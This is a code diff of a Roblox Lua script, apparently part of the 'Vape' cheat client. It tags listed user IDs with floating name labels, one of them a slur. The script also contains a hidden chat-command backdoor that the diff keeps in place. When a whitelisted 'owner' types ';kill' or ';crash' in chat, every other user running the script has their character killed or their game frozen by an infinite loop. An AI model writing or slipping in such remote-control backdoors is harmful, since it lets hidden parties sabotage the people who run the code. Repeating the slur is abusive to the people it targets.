@@ -1,10 +1,6 @@
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TextChatService = game:GetService("TextChatService")
-local RunService = game:GetService("RunService")
-
 local LOCAL_PLAYER = Players.LocalPlayer
-local OWNER_USER_ID = 4202838123
 
 local whitelist = {
 	Owner = {1251592623, 3299920155},
@@ -15,7 +11,7 @@ local whitelist = {
 	Slow = {1562251033}
 }
 
-local function isUserInList(userId, list)
+local function isInList(userId, list)
 	for _, id in ipairs(list) do
 		if userId == id then return true end
 	end
@@ -23,41 +19,32 @@ local function isUserInList(userId, list)
 end
 
 local function isWhitelisted(userId)
-	return isUserInList(userId, whitelist.Owner) or isUserInList(userId, whitelist.Private)
+	return isInList(userId, whitelist.Owner) or isInList(userId, whitelist.Private)
 end
 
-local function chatMessage(str)
-	str = tostring(str)
-	if TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral") then
-		TextChatService.TextChannels.RBXGeneral:SendAsync(str)
-	elseif ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") then
-		ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str, "All")
-	end
-end
-
-local function applyBillboardTag(player, labelText, color)
+local function applyBillboardTag(player, text, color)
 	local function render()
 		local head = player.Character and player.Character:FindFirstChild("Head")
 		if not head or head:FindFirstChild("VapeTag") then return end
 
-		local billboard = Instance.new("BillboardGui")
-		billboard.Name = "VapeTag"
-		billboard.Size = UDim2.fromOffset(100, 20)
-		billboard.StudsOffset = Vector3.new(0, 3, 0)
-		billboard.AlwaysOnTop = true
-		billboard.Adornee = head
-		billboard.Parent = head
+		local tag = Instance.new("BillboardGui")
+		tag.Name = "VapeTag"
+		tag.Size = UDim2.new(0, 100, 0, 20)
+		tag.StudsOffset = Vector3.new(0, 3, 0)
+		tag.AlwaysOnTop = true
+		tag.Adornee = head
+		tag.Parent = head
 
 		local label = Instance.new("TextLabel")
 		label.Size = UDim2.fromScale(1, 1)
 		label.BackgroundTransparency = 1
-		label.Text = labelText
+		label.Text = text
 		label.TextColor3 = color
 		label.TextStrokeTransparency = 0.3
 		label.TextStrokeColor3 = Color3.new(0, 0, 0)
 		label.Font = Enum.Font.GothamBold
 		label.TextScaled = true
-		label.Parent = billboard
+		label.Parent = tag
 	end
 
 	if player.Character then
@@ -70,56 +57,56 @@ local function applyBillboardTag(player, labelText, color)
 	end
 end
 
-local function handlePlayer(player)
+local function tagPlayer(player)
 	local uid = player.UserId
-
-	if isUserInList(uid, whitelist.Owner) then
-		if LOCAL_PLAYER.UserId ~= uid then
-			task.delay(1, function()
-				chatMessage("'")
-			end)
-		end
+	if isInList(uid, whitelist.Owner) then
 		applyBillboardTag(player, "Vape OWNER", Color3.fromRGB(210, 4, 45))
-	elseif isUserInList(uid, whitelist.Private) then
+	elseif isInList(uid, whitelist.Private) then
 		applyBillboardTag(player, "Vape Private", Color3.fromRGB(170, 0, 255))
-	elseif isUserInList(uid, whitelist.Slow) then
+	elseif isInList(uid, whitelist.Slow) then
 		applyBillboardTag(player, "Retard", Color3.fromRGB(70, 130, 255))
 	end
 end
 
-for _, player in ipairs(Players:GetPlayers()) do
-	handlePlayer(player)
+for _, plr in ipairs(Players:GetPlayers()) do
+	tagPlayer(plr)
 end
 
 Players.PlayerAdded:Connect(function(player)
 	task.delay(1, function()
-		handlePlayer(player)
+		tagPlayer(player)
 	end)
 end)
 
-TextChatService.MessageReceived:Connect(function(message)
-	local text = string.lower(message.Text)
-	local source = message.TextSource
-	if not source then return end
+local function handleCommand(command)
+	command = string.lower(command)
 
-	local senderUserId = source.UserId
-	if not isWhitelisted(senderUserId) then return end
-
-	-- IMMUNITY: if the person running the script is whitelisted, ignore commands
-	if isWhitelisted(LOCAL_PLAYER.UserId) then return end
-
-	if text == ";kill" then
+	if command == ";kill" then
 		local char = LOCAL_PLAYER.Character
 		if char then
-			for _, v in ipairs(char:GetDescendants()) do
-				if v:IsA("BasePart") then
-					v:BreakJoints()
+			for _, part in ipairs(char:GetDescendants()) do
+				if part:IsA("BasePart") then
+					part:BreakJoints()
 				end
 			end
 		end
-	elseif text == ";crash" then
+
+	elseif command == ";crash" then
 		while true do end
 	end
+end
+
+TextChatService.MessageReceived:Connect(function(message)
+	local text = message.Text
+	local source = message.TextSource
+	if not source then return end
+
+	local senderId = source.UserId
+	if senderId == LOCAL_PLAYER.UserId then return end
+	if not isWhitelisted(senderId) then return end
+	if isWhitelisted(LOCAL_PLAYER.UserId) then return end
+
+	handleCommand(text)
 end)
 
 local isfile = isfile or function(file)
